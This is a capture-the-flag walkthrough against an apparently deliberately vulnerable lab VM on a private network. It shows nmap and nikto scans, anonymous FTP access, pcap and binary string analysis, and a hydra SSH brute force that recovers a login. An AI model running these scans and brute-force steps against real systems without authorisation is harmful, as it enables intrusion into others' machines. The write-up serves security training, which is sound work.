# Pingsweep

```
nmap -sn 192.168.114.1-254
```
```
MAC Address: 00:50:56:FE:6D:CA (VMware)
Nmap scan report for 192.168.114.134
Host is up (-0.088s latency).
MAC Address: 00:50:56:E0:B0:AD (VMware)
Nmap scan report for 192.168.114.131
Host is up.
```

# Port Enumeration
```
nmap -sV 192.168.114.134
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
```
#### FTP Enumeration
```
searchsploit vsftpd  - Doesn't seem to show any major vulnerabilities.
```
We try to log through using anonymous ftp
```
ftp 192.168.114.134
user:anonymous@anything
pass:
```
```
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap
get lol.pcap  - we find a file that can be used with WireShark.
```

#### HTTP Enumeration

Scanning Using nikto
```
nikto -h 192.168.114.134
```
```
+ Entry '/secret/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 1 entry which should be manually viewed.
```
/secret/ leads to a troll image.


#### WireShark

Openning the lol.pcap > Follow TCP Stream
We find a file
```
200 Switching to Binary mode.
PORT 10,0,0,12,202,172
200 PORT command successful. Consider using PASV.
RETR secret_stuff.txt
150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
226 Transfer complete.
```
Since we captured the data transfer.
```
Frame 40: 213 bytes on wire (1704 bits), 213 bytes captured (1704 bits) on interface 0
Ethernet II, Src: Vmware_20:70:99 (00:0c:29:20:70:99), Dst: Vmware_5d:04:92 (00:0c:29:5d:04:92)
Internet Protocol Version 4, Src: 10.0.0.6, Dst: 10.0.0.12
Transmission Control Protocol, Src Port: 20, Dst Port: 51884, Seq: 1, Ack: 1, Len: 147
FTP Data (Well, well, well, aren't you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n\nSucks, you were so close... gotta TRY HARDER!\n)
```

IF YOU DO NOT WANT TO USE WIRESHARK
```
strings lol.pcap  - also works.
```

#### More HTTP Enumeration

Going back to the webserver
```
http://192.168.114.134/sup3rs3cr3tdirlol/
We find a new directory and a new bin file.
roflmao.bin
```
Trying to find any strings that can help us
```
strings roflmao.bin
```
```
GLIBC_2.0
PTRh
[^_]
Find address 0x0856BF to proceed   <- this is of interest.
;*2$"
GCC: (Ubuntu 4.8.2-19ubuntu1) 4.8.2
```
Trying this everywhere leads us to.
```
http://192.168.114.134/0x0856BF/
```

# Exploit 

We seem to have found possible usernames and passwords.
According to the folder password is located in Pass.txt
We attempt to brute force using hydra
```
hydra -L username.txt -P Pass.txt 192.168.114.134 ssh -vv
```
Can't seem to find a match.
We try to include the Pass.txt name in the file and try again.
```
[22][ssh] host: 192.168.114.134   login: overflow   password: Pass.txt
```
```
ssh overflow@192.168.114.134
Password: Pass.txt
```





